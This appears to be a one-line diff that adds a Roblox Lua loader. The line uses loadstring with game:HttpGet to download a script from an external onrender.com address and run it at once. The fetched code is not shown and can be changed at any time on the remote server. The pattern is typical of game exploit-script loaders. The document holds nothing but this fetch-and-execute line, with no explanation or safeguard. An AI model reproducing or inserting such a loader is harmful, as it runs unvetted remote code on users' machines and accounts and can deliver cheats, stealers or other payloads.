@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luaris.onrender.com/luaris/files/scripts/loaders/8df41ef7e4204b268f64251eb4273dac"))()
